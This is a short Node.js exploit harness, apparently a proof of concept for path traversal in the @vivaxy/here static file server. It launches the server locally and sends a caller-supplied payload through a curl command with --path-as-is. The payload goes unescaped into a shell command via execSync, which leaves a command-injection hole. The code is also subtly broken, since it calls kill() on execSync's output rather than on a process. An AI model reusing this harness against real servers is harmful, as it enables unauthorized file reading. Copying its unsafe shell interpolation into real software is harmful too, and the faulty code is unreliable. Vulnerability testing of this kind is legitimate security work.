const path = require("path");
const { execSync } = require("child_process");

function exploitFunction(payload) {
  // Log the payload for debugging
  console.log("Payload:", payload);

  // Start the server
  const serverProcess = execSync("node ./node_modules/@vivaxy/here/index.js &", { stdio: 'inherit' });

  // Generate the attack string
  const attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${payload}"`;

  // Execute the attack string and capture the output
  const stdout = execSync(attack_string, { stdio: 'pipe' });

  // Kill the server process after the attack
  serverProcess.kill();

  return stdout.toString();
}

module.exports = { exploitFunction };